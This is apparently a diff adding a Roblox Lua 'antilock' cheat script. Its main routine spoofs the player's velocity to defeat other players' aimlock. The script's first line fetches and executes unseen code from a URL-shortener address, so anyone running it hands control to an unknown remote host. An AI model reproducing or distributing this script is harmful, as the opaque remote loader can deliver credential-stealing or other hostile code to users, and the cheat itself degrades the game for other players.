@@ -1,0 +1,38 @@
+loadstring(game:HttpGet("https://yip.su/2UgZK4",true))()
+wait(.1)
+getgenv().smtx = false
+getgenv().smtxAmount = 99999
+
+game:GetService("StarterGui"):SetCore("SendNotification", {
+Title = "incapable | antilock",
+Text = "Press L to toggle On/Off",
+Duration = 3,
+})
+
+game:GetService("UserInputService").InputBegan:Connect(function(inputObject)
+if inputObject.KeyCode == Enum.KeyCode.L then
+getgenv().smtx = not getgenv().smtx
+if getgenv().smtx then
+game:GetService("StarterGui"):SetCore("SendNotification", {
+Title = "incapable | antilock",
+Text = "On",
+Duration = 3,
+})
+else
+game:GetService("StarterGui"):SetCore("SendNotification", {
+Title = "incapable | antilock",
+Text = "Off",
+Duration = 3,
+})
+end
+end
+end)
+
+game:GetService("RunService").Heartbeat:Connect(function()
+if getgenv().smtx ~= false then
+local vel = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
+game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, getgenv().smtxAmount, 0)
+game:GetService("RunService").RenderStepped:Wait()
+game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = vel
+end
+end)
